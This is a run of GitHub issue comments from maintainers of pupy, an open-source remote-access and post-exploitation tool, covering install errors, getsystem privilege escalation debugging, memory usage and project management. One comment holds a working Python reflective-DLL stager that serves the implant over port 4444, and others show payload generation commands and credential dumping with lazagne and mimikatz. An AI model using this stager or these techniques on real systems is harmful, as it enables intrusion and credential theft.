the password is not asked anymore, but the server reboots all the time. \nI don't understand the problem because I use exactly the same method as the one used by hashdump. I will try to fix it when I will understand the problem. . Problem fixed in the #536 PR. Hi, \nI had exactly the same issue on a fresh install of Ubuntu 17.10. \n./pupysh.py --port 1234\nTraceback (most recent call last):\n  File \"./pupysh.py\", line 36, in <module>\n    from pupylib import PupyServer\n  File \"/home/yo/Documents/Tools/pupy/pupy/pupylib/__init__.py\", line 6, in <module>\n    from PupyCmd import *\n  File \"/home/yo/Documents/Tools/pupy/pupy/pupylib/PupyCmd.py\", line 50, in <module>\n    import pupygen\n  File \"/home/yo/Documents/Tools/pupy/pupy/pupygen.py\", line 19, in <module>\n    from pupylib import PupyCredentials\nImportError: cannot import name PupyCredentials\nTo fix it, try to run ./pupygen.py -h. It should failed giving you a more explicit error, here is mine: \nTraceback (most recent call last):\n  File \"./pupygen.py\", line 7, in <module>\n    from pupylib.utils.network import get_listener_ip, get_listener_port\n  File \"/home/yo/Documents/pupy/pupy/pupylib/__init__.py\", line 6, in <module>\n    from PupyCmd import *\n  File \"/home/yo/Documents/pupy/pupy/pupylib/PupyCmd.py\", line 50, in <module>\n    import pupygen\n  File \"/home/yo/Documents/pupy/pupy/pupygen.py\", line 27, in <module>\n    import pylzma\nImportError: No module named pylzma\nAll these dependencies are on the requirements.txt file. However, some dependencies failed doing pip install -r requirements.txt. So I had to install some of them manually. \nTry to fix all your errors, installing what's missing, it should work. \nHere are some dependencies I had to install on a fresh ubuntu install: \nsudo apt install python-dev\nsudo apt install python-m2crypto\nsudo apt install python-xlib\nAnd for pyautogui: \ngit clone https://github.com/asweigart/pyautogui\ncd pyautogui\nsudo python setup.py install\nHope it will work. . I have tested lazagne using the on_connect module and it works for me. However, you do not have the output printed on the screen that's why you may be confused. Credentials are stored directly on the database. You could see the content of the database as following: \n>> creds\nTo be sure, flush the database >> creds -F and run lazagne again, it should work.. This functionality has already been implemented. Select a host and if it's a windows, only windows module will be printed (same thing for other OS). To unselect all targets and list all module: select -g . Hi, \nThis is an interesting question and I think everyone who uses pupy has its own reason. \nMetasploit is a great framework and I used a lot meterpreter but I cannot say how many remote shells I have lost doing a wrong command or because I opened a shell and the process crashes. This is not a problem when you have the exploit, you reproduce it again and you have another shell back, but sometimes you cannot lose it. \nI think one of the main work we try to do on this tool is to be really stable (it could crash of course) but you should try it and you will see that you will get your session for a while (it could happen that some modules fails but your session should still work). \nThen I would say that one different thing from the other RAT project is the interactive shell (even on Windows) that is really usefull when you're testing an internal network and you need to check some net commands (or others). You should run interactive commands (such as \"runas\") with a real prompt requesting for your password, you will have an history of your previous requests, you could do CTRL-C, you could use powershell to have the tab completion, etc. \nThen, you have lots of really great projects in python on github. Pupy could load these files remotely on memory in order to use these tools. For example, you could use impackets, lazagne, beroot, netcreds, etc. on your target without writing anything on the disk. I know that some tools are written in powershell and can be loaded on memory as well (for example, beroot is quite similar as powerup), but some tools doesn't exists in powershell. \nYou have some other nice features such as loading a PE file in memory (such as mimikatz), and other modules like that. \nIt's easy to debug because the stactrace is prompted and you should be able to understand the problem better. And for me, it was easier to debug than meterpreter because I prefer Python. \nTry both and you will see what you prefer. . Hi, \nI have a question about some changes you have done. I don't understand the purpose of the proxy directory. These files are loaded to the client or are they used to proxify the server ? And I'm interested to understand how do you use these files. Thanks to help me to understand. \nAnother thing, right now, I do not use pupy on my desk but on a server that I share with other persons. And I have noticed, that pupy is not designed to work with multiple users. Maybe we should think about implementing this feature. I had to patch the source code to launch multiple pupy servers because right now, it is not possible, the web server listens on a hardcoded port.\nSo maybe it would be interesting to implement an api or something like that (not necessary a web gui) to communicate with multiple users on an unique daemon. In my point of view, this is something, we should \n think about a solution. \n. Thanks for your answer. I will try your proxy when I would have some time, it looks cool. \nIf I understood well, you put the proxy on a server you control with the SSL configuration. You say to the client to connect to the proxy and the proxy will redirect the traffic to us where the pupy server is installed (in our desk for example). \n\nso your keys etc stays on pupysh (only exception is SSL) \n\nIt means that the network is decrypted on the server and send it back to our desk in cleartext (I suppose no, but I try to find the reason to add the SSL configuration). \nWhy adding the SSL configuration on the server instead of forwarding the traffic as a classic proxy (such as a TCP raw) ? \n\nBut in case you really going to do this let's discuss to build right architecture\n\nI agree, I won't change the entire architecture without discussing about a good way to do it. Right now, I do not have time at all, but I will think about it. . > I was uncomfortable to have ssl over ssl\nAhaha understood :). You should have some missing dependencies on your system. . otherwise, generate a dll and load it from a custom payload\n>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport. > It's pupi, like, bug babies.\nI also pronounce like that ;)\n. pip seems broken. It's not related to pupy. \nTry: hash -r pip\n. Lots of things have changed since June, so I close the issue . On your output, you have [+] Remote script is running in a x64 powershell process on a Wind10 x86 ? \nHmm this is weird. \nI have tested it on a Win10 x64 using ps1_oneliner and it worked for me. . Test using another payload (exe for example), test on linux (py) to check if your installation and your template binaries are correct too. \nIf it's a powershell problem or not. . Hi guys, \nAs I said to @n1nj4sec in private, he could add me as collaborator of the project. However, I'm like him, I could not spend all my free time working on it and answering issues. I'm totally agree to add @alxchk as collaborator, he's doing an amazing work, so it would be easier to push his commits without needed to do PRs. \nFor the master branch protected to force multiple people to review the code, I think it could be possible. I used to review PRs to understand how the project evolve but I hope it will not add me too much extra work. \nHowever, the project is growing and PRs should be still accepted, otherwise the project cannot evolve. So if we are multiple collaborators, we could manage it easily. \n. No the main goal is still working on the same project. Right now the project is in \"pause\" because we haven't decided yet how we can manage it correctly. \n@alxchk, what do you thing about becoming a collaborator in order to be able to merge PRs. Because, in few weeks, I would like to do PRs as well but I won't do it to avoid conflicts. So we should find a solution. \n. Great, that a good news ! :)\nWhen you said \"pending PRs\" you talking about all PRs except yours (https://github.com/n1nj4sec/pupy/pull/594) ? If we accept your PR and then we will manage conflicts on others, it should be ok or even your PR is out of date comparing to your fork? . Do not hesitate to merge your PR when you think it's ok, we will close PRs that you already embed into yours and for big PRs, like #568, I will check with @quentinhardy to find a way to resolve conflicts. :+1: . @n1nj4sec already gave me access to merge PRs, and I suppose @alxchk have access too. \nI was waiting @alxchk to merge his own PR when he was ready and then we will manage other PRs. Until that, I'm blocked too.  . Awesome work !!!! Thanks a lot\n\ud83d\udc4d . Not the best way, but if external/pykcp/kcp is still empty you could force the download directly cloning the remote repository inside external/pykcp/kcp: \ngit clone https://github.com/skywind3000/kcp/tree/110f9b19daefc7f2ba39c3597c8541fc28e755a1. I have worked on lazagne last few weeks and I have removed lots of dependencies (pycrypto is not used anymore) and some more. I have clean the git repository (a git clone downloaded a file of 250 Mb and now it would be like 5 Mb). \nEverything has been pushed on my github repository, I didn't merge to pupy yet because, it's still in development but it's stable so if you need we can merge it (because I don't know when I will finish all I wanted to do on it). . You use a version too recent of lazagne that is not yet compatible with your pupy version. Don't upgrade manually git submodules. . You are right it works using the compiled bin :). \nThanks ! . Awesome it fixed the issue, it seems to easy for you :). It occurs only for oneliner payloads (py_oneliner and ps1_oneliner). \n^C allows to stop the listening server and retrieve the control to interact with sessions. To keep the server up when interacting with sessions, pupygen.py has to be used as a separate script. \n./pupygen.py -h\n. Ok, no problem to let shell_exec. Just for my curiosity, in which case will you use shell_exec instead of pexec? . Ok I understand. \nI also use the interactive_shell, but it happens in some hardened Windows (mostly Citrix environment) that cmd and powershell are blocked. . If you use ps1_oneliner, you should know that each time, you restart the server, a new connection string is randomly generated as you can see here. So you can use the same connection string until the server is not closed. \nTo do that, you should use ./pupygen -f ps1_oneliner, otherwise, if it's only to get one connection (one shot), you should use gen -f ps1_oneliner inside pupysh. \nIt has been developped like that. The py_oneliner does not have this behavior, so maybe we could changed it to work as this payload. . Right now, you cannot doing anything without modifying yourself the code. Get your previous working url and change it manually replacing url_random_one by yours. . It's a really cool module, so I think it could be useful. But maintaining another tool whereas it's done on the main github project has no sense. I have removed it. Thanks. . To keep the server running, use pupygen.py: \n./pupygen.py -f ps1_oneliner ..... Build an x86 exe and run it with admin privilege and then call getsystem to be sure the issue come from getsystem and not from the bypassuac process or from powershell. \nI have tested it on win8.1 and it worked for me. . Hmm I don't have access to Windows 10 right now :(. Hi, \nSorry to not merge your PR but some conflicts were present with the @alxchk push and I didn't take the time to try it. \nI have tried the module without success. If you have an example of how you made it to work, it will be great. \nOn Windows 8.1 and Windows 10, it never find a process with SYSTEM integrity level. When I do a print of all integrity level found, here is the output (same result on windows 10): \n```\n\n\nsessions \nid  user  hostname  platform  release  os_arch  proc_arch  intgty_lvl  address      tags  \n\n\n\n1   xxx   xxxx    Windows   8.1      AMD64    64bit      High        xx.xx.xx.xx        \n\n\ngetsystem -m inheritance -r\n[%] The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\n[%] Trying to configure for running the current executable on the target as SYSTEM\n[%] Method 'Handle Inheritance' (Parent Method) chosen\n[%] Getting information about all processes running on the target\n[%] Searching a process with a 'SYSTEM' integrity level\n1\n1\n1\nMedium\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\n1\nMedium\n1\nMedium\n1\n1\nMedium\nMedium\nMedium\n1\n1\nMedium\nMedium\n1\nHigh\n1\n1\n1\n1\n1\nWhen I forced, the ppid to a system process, I got this:\ngetsystem -m inheritance --ppid 528 -r \n[%] The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\n[%] Trying to configure for running the current executable on the target as SYSTEM\n[%] Method 'Handle Inheritance' (Parent Method) chosen\n[%] Using the Parent Process method on the pid 528...\n2018-11-26 10:18:31,379| (6, 'Descripteur non valide')\n\n\n========= Remote Traceback (1) =========\nTraceback (most recent call last):\nWindowsError: [Error 6] Descripteur non valide\n[-] (6, 'Descripteur non valide')\n```\nPlease don't forget to run flake8 before doing a commit, otherwise, it would never pass travis checks.\nThanks :) \n. @alxchk, I don't have time to debug this error right now, but with high integrity session, I cannot get the integrity level of other processes. OpenProcessToken always fails, so I get \"1\" as return value. \nWith the same session, doing >> ps -i, on the process owner column, it's empty for all system processes. So as I put on my previous output, the module stops because it does not found any SYSTEM processes. \nWhen I get system (using other method), I can see every system processes and OpenProcessToken works so the inheritance method works (from system to system). \nI don't know if I'm the only one having this error but right now, I cannot use the inheritance getsystem method. . I have tried after merging the code and I still have the same issue. \nHere is the output of ps: \n```\n\n\nps -i \n   0 NT AUTHORITY\\SYSTEM   0%   0% {System Idle Process} \n   4 NT AUTHORITY\\SYSTEM   0%   0% {System} \n  68                       0%   0% {Registry} \n 220                       0%   0% {WmiPrvSE.exe} \n 304                       0%   0% {smss.exe} \n 388                       0%   0% {csrss.exe} \n 456                       0%   0% {wininit.exe} \n 464                       0%   0% {csrss.exe} \n 524                       0%   0% {winlogon.exe} \n 560                       0%   0% {services.exe} \n 584                       0%   0% {lsass.exe} \n 648                       0%   0% {fontdrvhost.exe} \n 656                       0%   0% {fontdrvhost.exe} \n 672                       0%   1% {svchost.exe} \n 740                       0%   1% {svchost.exe} \n 768                       0%   0% {svchost.exe} \n 804                       0%   1% {svchost.exe} \n 868                       0%   2% {dwm.exe} \n 948                       0%   2% {svchost.exe} \n 960                       0%   1% {svchost.exe} \n 992                       0%   1% {svchost.exe} \n1008                       0%   2% {svchost.exe} \n1064                       0%   1% {svchost.exe} \n1184                       0%   0% {VBoxService.exe} \n1316                       0%   1% {Memory Compression} \n1424                       0%   0% {svchost.exe} \n1488                       0%   0% {svchost.exe} \n1512                       0%   0% {svchost.exe} \n1520                       0%   0% {svchost.exe} \n1596                       0%   0% {spoolsv.exe} \n1712                       0%   0% {svchost.exe} \n1772                       0%   0% {svchost.exe}\n2604 DESKTOP\\test   0%   4% C:\\Windows\\explorer.exe\n.....\n6956 AUTORITE NT\\Syst\u00e8me   0%   0% C:\\Windows\\System32\\SearchFilterHost.exe 0 736 740 748 8192 744\n....\nAnd here is with tasklist:\nshell_exec tasklist /v\nNom de l'image                 PID Nom de la sessio Num\ufffdro de s Utilisation  \ufffdtat            Nom d'utilisateur                                  Temps proces Titre de la fen\ufffdtre                                                   \n========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================\nSystem Idle Process              0 Services                   0         8 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:30:04 N/A                                                                   \nSystem                           4 Services                   0        92 Ko Unknown         N/A                                                     0:00:07 N/A                                                                   \nRegistry                        68 Services                   0     8\ufffd404 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:00:01 N/A                                                                   \nsmss.exe                       304 Services                   0       916 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:00:00 N/A                                                                   \ncsrss.exe                      388 Services                   0     4\ufffd236 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:00:00 N/A                                                                   \nwininit.exe                    456 Services                   0     3\ufffd624 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:00:00 N/A                                                                   \ncsrss.exe                      464 Console                    1     3\ufffd840 Ko Running         AUTORITE NT\\Syst\ufffdme                                     0:00:00 N/A                                                                   \nwinlogon.exe                   524 Console                    1     5\ufffd532 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:00:00 N/A                                                                   \nservices.exe                   560 Services                   0     6\ufffd080 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:00:01 N/A                                                                   \nlsass.exe                      584 Services                   0    11\ufffd192 Ko Unknown         AUTORITE NT\\Syst\ufffdme                                     0:00:01 N/A       \n......\n```\nI will check why this happen, right now I don't have time to check it sorry. Just to let you know. . You were right, I needed to have SeDebugPrivilege to do it. \nBut in your last merge, it was done on your code, maybe you didn't push it. Anyway, I added it but if you want to do it in another part of the code, feel free to change it. \n\n\nI added it on the \"ps\" module as well when we have high privilege only.  . > Hello,\n\nI have detected some bugs/problems on Pupy (when the target is WIndows):\n* impossible to scroll back in an interactive shell (very annoying); (regression).\n\n* impossible to see (all) outputs of a powershell script in the psh module (very annoying too). Tested with **_powerview_** for example.\n\n* Some time, the powershell script (in _psh_ module) stops working after few minutes. Tested with **_powerview_** for example.\n\n* I have tested to load some exe. It seems this module works for mimikatz only for me. Tested with some Sharp* exe.\n\nYou cannot load a .Net file format as a classic PE file. It's not a bug, it's not supported right now. CLR should be loaded before being able to run the code.\n* RDP module does not work;\n\nDo you have more information ? What does not work? \n* Impossible to run mimikatz (or some other modules) on a list of pupy sessions.\n\nWhat's the error ? I have tested to run modules on multiple sessions and it work for me.\nSometimes, it was necessary to press enter, after calling mimikatz to retrieve the pupy session. So if you run mimikatz on 10 sessions, you should press 10 times enter. That's why, it was possible to use an external dependency to realize this action. Maybe this is why, you're saying that it does not work. It's an ugly patch that should be fixed.\nIn my opinion, it should be very (very) interesting to have a real stable/tested release branch because it is annoying to have \"regressions\" when you use it outside a lab (in the real life).\nThanks again for this very good project,\nBest regards,\n\n. Hi @fastchain, \nLazagne uses a modified version of pypykatz to work. The original Pypykatz needs some modules to work such as minikerberos that lazagne does not need. So in the modified version, some try/catch have been added during the import process (e.g. here). \nThese messages are printed but the minikerberos module is not used, so it's not really an error. Pupy prints all error/debug messages that's why you see it, but lazagne run well. \n. Cheers, thanks for the correction !\n. ",
    "alxchk": "This should work now. Please try.\n. Fixed in https://github.com/alxchk/pupy/commit/57fdce37b4f985fa789f7edcf205881a0c1ef828. It for that situations when you need to upload shell\n. In case if somebody will ran to the same problem, here is quick and dirty PoC of loader, which was stolen and rewritten to human language from metasploit:\n``` #!/usr/bin/python\nimport struct\nimport socket\nimport sys\nimport pefile\nimport keystone\nexit_types = {\n      ''        : 0,          # Default to nothing\n      'seh'     : 0xEA320EFE, # SetUnhandledExceptionFilter\n      'thread'  : 0x0A2A1DE0, # ExitThread\n      'process' : 0x56A2B5F0, # ExitProcess\n      'none'    : 0x5DE2C5AA  # GetLastError\n}\ndef create_payload(source='pupy.dll', exit='thread'):\n    dll = open(source, 'rb').read()\n    pe = pefile.PE(data=dll)\noffset = 0\n\nks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)\nks.syntax = keystone.KS_OPT_SYNTAX_INTEL\n\nfor entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:\n    if 'ReflectiveLoader' in entry.name:\n        offset = pe.get_offset_from_rva(entry.address)\n        break\n\nprint '[+] Reflective loader offset: {}'.format(offset)\n\nasm = '''\n      dec ebp               ; 'M'\n      pop edx               ; 'Z'\n      call 7                ; call next instruction\n      pop ebx               ; get the current location (+7 bytes)\n      push edx              ; restore edx\n      inc ebp               ; restore ebp\n      push ebp              ; save ebp for later\n      mov ebp, esp          ; set up a new stack frame\n      ; Invoke ReflectiveLoader()\n      ; add the offset to ReflectiveLoader() (0x????????)\n      add ebx, 0x{rdi:08x}\n      call ebx              ; invoke ReflectiveLoader()\n      ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)\n      push edi              ; push the socket handle\n      push 4                ; indicate that we have attached\n      push eax              ; push some arbitrary value for hInstance\n      mov ebx, eax          ; save DllMain for another call\n      call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, socket)\n      ; Invoke DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)\n      ; push the exitfunk value onto the stack\n      push 0x{exit:08x}\n      push 5                ; indicate that we have detached\n      push eax              ; push some arbitrary value for hInstance\n      call ebx              ; call DllMain(hInstance, DLL_METASPLOIT_DETACH, exitfunk)\n'''.format(rdi=offset-7, exit=exit_types[exit])\n\nbytecode, _ = ks.asm(asm)\nbytecode = ''.join(map(chr, bytecode))\n\ndll = bytecode + dll[len(bytecode):]\n\nreturn dll\n\ns = socket.socket()\ns.bind((\"0.0.0.0\", 4444))\ns.listen(10) # Acepta hasta 10 conexiones entrantes.\npayload = create_payload()\nwhile True:\n    sc, address = s.accept()\n    print address\n    sc.send(struct.pack('<I', len(payload)))\n    x = sc.send(payload)\n    print 'Sent: {}/{}'.format(x, len(payload))\n```\n. With standalone binary the same story:\n```\n\n\ninfo\nhostname  : loh-b93fc38b301\nuser      : vasily\nrelease   : XP\nversion   : 5.1.2600\nos_arch   : x86\nproc_arch : 32bit\npid       : 1240\nexec_path : C:\\Documents and Settings\\vasily\\Desktop\\pupy.exe\naddress   : ::ffff:192.168.57.101\nmacaddr   : 08:00:27:2C:79:7B\nuac_lvl   : ?\nintgty_lvl: ?\ntransport : ssl\nlauncher  : connect\nlauncher_args: ['--host', '192.168.57.1:443']\nps\n[-] cannot import name _common\n\n\n========= Remote Traceback (1) =========\nTraceback (most recent call last):\n  File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 305, in _dispatch_request\n  File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\protocol.py\", line 547, in _handle_callattr\n  File \"C:\\Python27\\Lib\\site-packages\\rpyc\\core\\service.py\", line 118, in getitem\n  File \"\", line 100, in exposed_getmodule\n  File \"\", line 110, in load_module\nImportError: cannot import name _common\n\n\n```\n. Ok, looks like it happens on Windows XP (SP2?). On Windows 10 there is no such problem.\n. When psutil built on Windows >=6 it will use GetTickCount64 function, which is missing in Windows 5. So I just rebuild from sources psutil on Wine/XP (https://github.com/n1nj4sec/pupy/issues/154).\n. I check difference with tsh shell (there are a lot of modifications, just for example - https://github.com/creaktive/tsh) and pupy's interactive shell (btw, there is mistake there with allocating terminal - https://github.com/alxchk/pupy/commit/49ae6024e89fa553538e0378418864b44c42a7aa, lineptyshell.py@21, interactive_shell.py@85). Tsh is dumb, so performance is ultimate. As far as I see, there is next situation.\n1. I press button in shell 1 time\n2. I press button in shell 2 time\n3. pupy catches 1 press\n4. pupy sends 1 press to client\n5. client sends 1 press to tty\n6. tty draws output\n7. client reads output \n8. client sends output using rpyc callback\n9. pupy reads output\n10. pupy draws output to tty\n11. pupy catches 2 press\n    ...\n\n\nI'm not really sure things working and how rpyc works over network, but it really feels like issues with rpyc communication. \n. Yes, you right.\nStill not so smooth like with tsh, but at least usable\n. So, here is simple test case\n1. Windows client\n2. exec \"start /B C:\\temp\\lolwut.exe\"\n   (At this moment nice dialog appears on the other end, that we don't have this executable, blablabla, but we don't see it here)\n3. WTF?! ^C^C^C^C^C\n4. ^C[!] interrupting job ... (please wait)\n   [*] Session 4 closed\n\n\n[!] job interrupted\n5. Silence\n. Well, looks like it's two different problems, which leads to the same result. I'll play a bit more with netem, but this behavior with hanged program should be resolved somehow I think\n. I think two things should be done.\n1. Killing any foreground client's job with ^C in pupysh\n2. Adding possibility to execute command in background as Job using Popen. Job interface is ok for that - you can get output or terminate process - same as Popen interface. To not be blocked Popen.poll can be used\n. https://github.com/alxchk/pupy/commit/d6f04b91688f57e8dab472f663d5aa4cb12b5cd5\n\n\nPupy need some API to make tasks interactive/non-interactive on request. Like ^Z in shell.\n. Something wrong with popen. What ever I try I couldn't write fully reliable code.\nI even tried next:\non pp.py side there is thread, which in blocking mode reads stdout, and places to queue. Then main pp.py thread read with get_nowait() data from there. Even in that case when stdout reader thread blocks, pp.py doesn't receive commands from pupy shell. In pupy shell I see that it tries to make remote call of termination thread, but it's not called until program unblocks.\n. Well, I'm just an idiot\n. So, here is my final version. If you'll have time check it somewhere:\nhttps://github.com/alxchk/pupy/commit/e1719b6c3b68117f814e8766286ac1735a1ea1d1\n. And finally last part of the puzzle:\nhttps://github.com/alxchk/pupy/commit/720e85a156a4c64606460d2838b83fd0c469530b\n. You can try to use one from my repo - https://github.com/alxchk/pupy-binaries.\nAlso if you have issues with linux loader - write to my tracker (https://github.com/alxchk/pupy)\n. I merged creds branch to my repo - 56df436d\nYou can try to use it. I tested this on W10/AMD64, CentOS5, Ubuntu 9.04, Gentoo ~amd64.\nI put to repo missing modules (crypto.so, _sqlite3.so, _scandir.so, _elementtree.so), dbus is embedded to client template. Modules built on woody/x86 and etch/amd64. \nNotes about binary compatibility can be found here - https://github.com/alxchk/pupy/blob/master/client/sources-linux/NOTES\n. It's quite strange. I just check with Ubuntu 15.10/amd64 desktop + firefox. It work for me for fresh clone of pupy repo and amd64 payload from my templates (https://github.com/alxchk/pupy-binaries/blob/master/pupyx64.lin):\n\nPlease try to do fresh clone of @n1nj4sec mainstream repo, replace payload_templates with my ones, try to generate, upload and use. If it will not work, I'll upload debug templates.\n. Well, while reporting actual path to executable is clearly broken and should be fixed, I think this technique will not work anyway. Executable may and very likely be:\n1. deleted\n2. melted into another process (using ptrace or LD_PRELOAD)\n. I likely should clean patches a bit. More than 50 changes is hard to merge, and some of them were completely rewritten in the end.\n. https://bitbucket.org/alxchk/ps1toexe -- horrible, but may work :D\n. I just use \ngit clone --recursive https://github.com/n1nj4sec/pupy.git pupy\nCalling separately submodule commands results in same error for me. I checked on other PCs and it works. So it should be something with my local configuration. But I can't image what it can be =\\\n. Well. git version where it works - 2.1.2, two pcs where it doesn't - 2.10.2\n. What Is the reason to build client using windows/MSVC? Pupysh doesn't work properly there anyway, is it?. Cmon. This is opensource tool. It will be detectable. Always.. Likely connection hang. When you press ^C pupysh run background ping. It fails and it breaks connection. Other side may not know that connection was interrupted. You can try to find out, does netstat have registered connection from client or not. Also you may build|use debug demplate to find what is going on on client.. This in not that timeout you look for. This one for authentication. Keepalives for client set here - https://github.com/n1nj4sec/pupy/blob/master/pupy/network/lib/clients.py#L38. Btw, you are using \"connect\" (default) launcher for pp.py, right?\nYou can try to play with them, and if they fix your situation, probably they should become configurable (or maybe new hardcoded values will be good for all :) ). \nAs far as I remember, client rely just on network stack to find that connection is dead. Probably it also be good to have client level pinging or something like that... Also you probably should investigate what is going on using wireshark. There should be the reason why your channel becomes dead. Maybe some issues with fragmented traffic, or traffic with low delays, or something like that.. https://github.com/n1nj4sec/pupy/issues/152. Use python2. >  the .so is still written to disk, this leaves a forensic footprint...\nWell, it's better to integrate https://github.com/infosecguerrilla/ReflectiveSOInjection.\nIt's on my todo list, but currently I simply don't have time to do that. If you are interested in such things, you can try.\n\nIs it worth adding 'memfd' support?\n\nIt's better to use ancient technologies to make pupy works on any binary distro. Currently single agent can run on any distro since 2003.. > Why use ReflectiveSO when its significantly more complex and only supports x86_64?\nIt will be better because it will work everywhere.\nIt supports only x86_64 because author just write code for that arch. Nobody prevent us to write missing parts for x86 and arm for example.\n\nAs it is the tmplibrary code seems to do the job, portably and cleanly, while memfd should be a relatively simple patch.\n\nWell, why not.  But this will works only on kernels >= 3.17, and also can be built only with recent glibc. If use memfd as an runtime option, then probably syscalls should be written manually, without touching glibc functions to be able to use same binary template everywhere.. > Linux kernel headers at compile time to get the syacall number specific to the architecture.\nCan be hardcoded.\n\nHmm, so ya its probably worth me having a quick go at this when I get back to a Linux box.\n\nYou can try to build it with my branch (https://github.com/alxchk/pupy/blob/master/client/sources-linux/buildenv.sh).. I added memfd support to my experemental branch - https://github.com/alxchk/pupy/commit/f1e7ace087fb4adca56e7ee4f299203ae0e5b298\nLooks like it works. I will check on more systems and will create pull request here then.. If you have access to Mac, can you please try mss for screenshots? https://github.com/alxchk/pupy/commit/148548b01d82cac8983dce47d1114f46b9907336\nI need to rewrite finally that forwarding and create pull request.... I change a lot there, some decisions were time consuming but broken (for example new network forwarding, which crashes on windows). Currently I'm on loong huge pentest, so I test that new functionality. After I fix major issues I'll start poll request. This may be resolved with this commit - https://github.com/alxchk/pupy/commit/f6b1b03b296cdb2823ca4c4ffa002d6ffdbe31a1\nBut I'm not 100% sure. No. It turns out to be alias to \nfrom SocketServer import *\nLikely comes with dnslib as dependency. ERROR: Permission to n1nj4sec/pupy.git denied to alxchk.\n:(.  Both of them are quire crappy.. From my experience WES never suggest something useful :) \nMaybe it's better to just write nice \"native\" python modules for collection information about the system on the pupy side.. Please try unstable branch, which has PupyConfig merged. It creates folders automatically . > 25Mo of RAM is not that bad is it ? :)\nWell, for 1-week shut-and-run projects  it doesn't matter, but for long term pentests reliability and stealth are vital. And hanged \"bash\" which has size of 80Mb isn't something stealth :)\n\npupy can run without pycrypto (there is a lightweight, pure python replacement in lib/transports/cryptoutils/pyaes/) that can be used if pycrypto is missing for all transports using AES (but it's slower).\n\nI think pure python code can stay for some limited cases, but for regular operation it's better to have something native. It's still a question, are native modules really faster in case of usage in python (where still tonns of overhead around), but speed is vital for cases when you need to transfer a lot of data, which are quite regular.\n\nBut I agree we should use only one crypto library at least for pupy internals. I don't know pycryptodome but it seems they only make bugfix releases and cryptography is more famous so I think we should go for cryptography but perhaps you have arguments to go the other way ?\n\nBetween cryptography and pycryptodome I'd like to stay with pycryptodome. In normal world where people write software using their brain and feel of beauty cryptography should be better, because it uses openssl as backend (and ssl and other stuff depends on openssl anyway). But somehow they managed to make _bindings to openssl much more larger than openssl library itself. More then that, it's memory usage is horrible.  To compare:\nStandard python 2.7.13/Linux + loaded library\n|                 | VSS      | RSS   |\n|---------------|---------|-------|\n|Cryptography| 133852|29040 |\n|PyCryptodome| 61780|9308   |\nIt's amazing. I can't say this fact can surprise me. After observing that shit which is named python standard library not so much things can surprise me. But, anyway, some libs are using cryptography, and there is strong tendency. So, there are three ways to deal with this. \n\nMove pupy to cryptography. It will eat about 40-50 MBs of RAM from the beginning, but futher loading will not increase it.\nStay with pycryptodome, and close eyes on double loading. Anyway, not so much modules depends on cryptography for now, and those which are quite fat anyway.\nRewrite or make adoptation for modules and libs which depends on cryptography to use pycryptodome (if it's possible of course).\n\nPersonally I'd like to stay with (3) or (2).\n\nPerhaps a solution would be to put a mechanism in place to unload some python modules after pupy's module finished ? idk if cleaning sys.modules[module] and call gc.collect() would be enought to free some RAM\n\nWell, I killed a lot of time to make situation better. You can check in unstable branch (but most things are already merged). Python is very fat by itself, and any loaded resource, any docstring make situation worse.. .. And this is a wrong way to go. If you'll take a look into python sources, you'll find that _PyModule_Clear is used in Module object destructor (https://github.com/python/cpython/blob/2.7/Objects/moduleobject.c#L226).\nSo, it's all about references.\n```\nimport psutil\nimport os, gc, sys\np = psutil.Process()\nwith open('lol.py', 'w') as out:\n    out.write('A=\"a\"3010**6'+'\\n')\nprint \"0. RSS: \", p.memory_info().rss\nimport lol\nlol_id = id(sys.modules['lol'])\nprint 'Module object ID: ', lol_id\nprint \"1. RSS: \", p.memory_info().rss\nWe can just delete contents, if we don't know the source of\nreference leakage to get immediate result.\nfor k in sys.modules['lol'].dict.keys():\ndel sys.modules['lol'].dict[k]\ngc.collect()\nprint \"2. RSS: \", p.memory_info().rss\ndel sys.modules['lol']\ngc.collect()\nprint \"3. RSS: \", p.memory_info().rss\nfor obj in gc.get_objects():\n    if id(obj) == lol_id:\n        print 'Referrers: ', [\n            id(x) for x in gc.get_referrers(obj)\n        ]\ndel lol\ngc.collect()\nprint \"5. RSS: \", p.memory_info().rss\nfor obj in gc.get_objects():\n    if id(obj) == lol_id:\n        print 'Referrers: ', [\n            id(x) for x in gc.get_referrers(obj)\n        ]\n```\n0. RSS:  12697600\nModule object ID:  140243407739656\n1. RSS:  42766336\n2. RSS:  42766336\n3. RSS:  42766336\nReferrers:  [140243377852856, 140243409019240]\n5. RSS:  12910592. BTW, reloading module with lower memory consuption is working in pupy even now. You can easily check this.\n```\ncat >packages/all/lol.py\nA=\"a\"3010**6\nrun load_package -f lol\nrun ps -I MEMORY_INFO -s PUPY_PID_HERE\ncat >packages/all/lol.py\nA=\"lol\"\nrun load_package -f lol\nrun ps -I MEMORY_INFO -s PUPY_PID_HERE\n```. I added experemental support for 1-time loading (run -1 lol).\nhttps://github.com/alxchk/pupy/commit/1ebe820b5710f4acb9e21774ae4c2af235df10f6\nIt's still quite useless, but shows several things which should be taken into account once dealing with RPyC. Only if you use ps1 payload. Current memory consumption stays around 30-60mb. Of course this depends on loaded modules . There is no easy way to debug this. You can try to monitor which sequence of actions leads to this. Initial consumption should be around 22-26 mb depends on situation. Then try to figure out which actions trigger memory growing. You can try prebuilt docker image. 